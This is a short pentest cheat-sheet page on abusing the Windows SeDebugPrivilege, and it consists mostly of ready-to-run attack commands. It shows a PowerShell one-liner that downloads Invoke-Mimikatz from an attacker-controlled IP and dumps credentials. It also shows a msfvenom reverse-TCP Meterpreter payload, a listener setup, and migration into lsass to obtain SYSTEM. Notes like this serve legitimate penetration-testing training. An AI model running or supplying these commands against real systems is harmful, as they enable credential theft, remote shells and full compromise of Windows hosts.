# SeDebugPrivilege

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege-3.1.9" %}

It allows the holder to **debug another process**, this includes reading and **writing** to that **process' memory.** There are a lot of various **memory injection** strategies that can be used with this privilege that evade a majority of AV/HIPS solutions.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

### Mimikatz

{% code overflow="wrap" %}
```bash
PS> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.38/post/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds
```
{% endcode %}

### Meterpreter&#x20;

{% code overflow="wrap" %}
```bash
# Create a meterpreter shell
Kali> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.38 LPORT=1236 -f exe -o mtp1236.exe 

# Start a listener 
Kali> 
sudo msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set AutoRunScript post/windows/manage/migrate;set LHOST 10.10.14.38;set LPORT 1236;run -j"

# Run a meterpreter shell
CMD> .\mtp1236.exe

# Check uid and privilege
meterpreter> getuid
meterpreter> getprivs

# Process migration to a process running as NT/SYSTEM 
meterpreter> pgrepp lsass 
636
meterpreter> migrate 636

# Check uid and privilege again
meterpreter> getuid
meterpreter> getprivs
```
{% endcode %}

### Other exploitations&#x20;

[https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)\
[https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)\
